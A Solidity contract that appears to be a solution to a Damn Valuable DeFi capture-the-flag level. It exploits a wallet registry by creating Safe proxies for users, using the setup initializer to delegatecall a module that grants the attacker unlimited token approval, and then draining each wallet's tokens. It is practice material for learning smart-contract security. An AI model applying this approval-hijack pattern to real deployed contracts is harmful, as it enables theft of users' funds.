// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";

contract Module {
    DamnValuableToken immutable token;
    address immutable solution;

    constructor(DamnValuableToken _token, address _solution) payable {
        token = _token;
        solution = _solution;
    }

    function approve() external {
        token.approve(solution, type(uint256).max);
    }
}

contract Solution {
    constructor(
        DamnValuableToken token,
        SafeProxyFactory factory,
        address singleton,
        IProxyCreationCallback walletRegistry,
        address[] memory users,
        uint256 threshold,
        address recovery,
        uint256 amount
    ) payable {
        // module, which the depolyed proxy will delegatecall to approve
        Module module = new Module(token, address(this));
        bytes memory data = abi.encodeCall(module.approve, ());

        address[] memory user = new address[](1);
        for (uint256 i; i < users.length; ++i) {
            user[0] = users[i];
            // create a new safe and delegatecall approve from the module
            bytes memory initializer = abi.encodeCall(
                Safe.setup, (user, threshold, address(module), data, address(0), address(0), 0, payable(address(0)))
            );
            address proxy = address(factory.createProxyWithCallback(singleton, initializer, 0, walletRegistry));

            // transfer tokens
            token.transferFrom(proxy, recovery, amount);
        }
    }
}
